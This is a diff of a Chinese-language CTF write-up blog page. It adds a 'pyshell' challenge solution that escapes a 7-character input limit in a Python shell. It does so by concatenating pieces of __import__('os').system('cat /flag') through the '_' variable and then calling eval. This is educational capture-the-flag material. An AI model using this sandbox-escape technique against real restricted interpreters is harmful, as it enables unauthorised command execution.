@@ -69,7 +69,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unzip"><span class="toc-text">Unzip</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyRE"><span class="toc-text">babyRE</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unzip"><span class="toc-text">Unzip</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyRE"><span class="toc-text">babyRE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pyshell"><span class="toc-text">pyshell</span></a></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -212,7 +212,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ff7d73">CTF线上赛</a>
+                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ffa2c4">CTF线上赛</a>
             </span>
             
         </span>
@@ -316,6 +316,37 @@ flag <span class="token operator">=</span> <span class="token string">'f'</span>
 
 <span class="token comment"># flag&#123;12307bbf-9e91-4e61-a900-dd26a6d0ea4c&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2><blockquote>
+<p>python</p>
+</blockquote>
+<p>nc连上靶机，回显”Welcome to this python shell,try to find the flag!”</p>
+<p>得知是一个python的交互环境</p>
+<p>经过测试发现最大输入长度只能为7，否则会返回”nop”</p>
+<p>题目描述说flag在&#x2F;flag</p>
+<p>那就先直接cat &#x2F;flag</p>
+<p>而在python的交互环境下，命令执行的语句是</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接下来的问题就是怎么绕过这个长度限制</p>
+<p>我们知道linux的环境变量中有一个<code>_</code>会记录上一次的表达结果，其实python交互环境下也是如此</p>
+<p>所以我们接下来分别输入以下内容即可获取flag</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">'__imp'</span>
+_+<span class="token string">'ort'</span>
+_+<span class="token string">'__('</span>
+_+<span class="token string">"'os"</span>
+_+<span class="token string">"')."</span>
+_+<span class="token string">"sys"</span>
+_+<span class="token string">"tem"</span>
+_+<span class="token string">"('c"</span>
+_+<span class="token string">"at "</span>
+_+<span class="token string">"/fl"</span>
+_+<span class="token string">"ag'"</span>
+_+<span class="token string">")"</span>
+eval<span class="token punctuation">(</span>_<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/05/29/CISCN2023/image-20230531185521073.png" alt="image-20230531185521073"></p>
 
     </div>
     
